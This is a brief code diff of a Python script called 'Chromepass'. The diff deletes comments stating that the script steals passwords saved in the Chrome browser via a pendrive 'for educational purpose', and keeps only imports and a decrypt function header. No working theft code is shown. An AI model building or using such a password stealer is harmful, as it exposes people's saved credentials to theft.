@@ -1,9 +1,6 @@
 # Chromepass
-//Steal password stored in chrome browser
-//Use pendrive properly
-//Only for educational purpose
-//Do not use for illegal purpose
-//Do  share
+
+
 import sqlite3, win32crypt, os, sys
 
 def decrypt(path, save_path):
